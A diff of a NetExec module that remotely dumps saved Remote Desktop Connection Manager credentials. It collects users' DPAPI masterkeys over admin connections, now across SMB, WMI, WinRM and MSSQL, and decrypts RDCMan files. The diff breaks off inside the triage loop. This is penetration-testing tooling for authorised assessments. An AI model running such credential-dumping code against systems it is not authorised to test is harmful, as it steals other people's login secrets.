@@ -1,55 +1,28 @@
 from dploot.triage.rdg import RDGTriage, RDGServerProfile
-from dploot.lib.target import Target
 
-from nxc.helpers.logger import highlight
 from nxc.helpers.misc import CATEGORY
-from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection
 
 
 class NXCModule:
     name = "rdcman"
     description = "Remotely dump Remote Desktop Connection Manager (sysinternals) credentials"
-    supported_protocols = ["smb"]
+    supported_protocols = ["smb", "wmi", "winrm", "mssql"]
     category = CATEGORY.CREDENTIAL_DUMPING
 
     def options(self, context, module_options):
         """ """
 
     def on_admin_login(self, context, connection):
-        username = connection.username
-        password = getattr(connection, "password", "")
-        nthash = getattr(connection, "nthash", "")
-
-        self.pvkbytes = get_domain_backup_key(connection)
-
-        target = Target.create(
-            domain=connection.domain,
-            username=username,
-            password=password,
-            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
-            lmhash=getattr(connection, "lmhash", ""),
-            nthash=nthash,
-            do_kerberos=connection.kerberos,
-            aesKey=connection.aesKey,
-            no_pass=True,
-            use_kcache=getattr(connection, "use_kcache", False),
-        )
-
-        conn = upgrade_to_dploot_connection(connection=connection.conn, target=target)
-        if conn is None:
-            context.log.debug("Could not upgrade connection")
-            return
-
-        self.masterkeys = collect_masterkeys_from_target(connection, target, conn, system=False)
+        self.masterkeys = connection.dpapi_triage.collect_masterkeys_from_target(dump_users=True, dump_system=False)
 
         if len(self.masterkeys) == 0:
             context.log.fail("No masterkeys looted")
             return
 
-        context.log.success(f"Got {highlight(len(self.masterkeys))} decrypted masterkeys. Looting RDCMan secrets")
+        context.log.success("Looting RDCMan secrets")
 
         try:
-            triage = RDGTriage(target=target, conn=conn, masterkeys=self.masterkeys)
+            triage = RDGTriage(target=connection.dpapi_triage.target, conn=connection.dpapi_triage.conn, masterkeys=self.masterkeys)
             rdcman_files, rdgfiles = triage.triage_rdcman()
             for rdcman_file in rdcman_files:
                 if rdcman_file is None:
